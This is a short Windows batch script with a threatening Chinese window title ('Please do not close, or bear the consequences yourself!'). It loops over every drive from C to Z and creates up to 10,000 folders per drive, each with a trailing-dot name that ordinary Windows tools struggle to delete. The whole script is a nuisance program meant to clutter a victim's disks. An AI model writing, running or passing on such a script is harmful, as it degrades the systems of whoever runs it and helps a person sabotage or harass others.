@echo off
title 请不要关闭否则后果自负！
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z
for /L %%a in (1,1,10000) do for %%b in (%alldrive%) do mkdir %%b:\jay%%a..\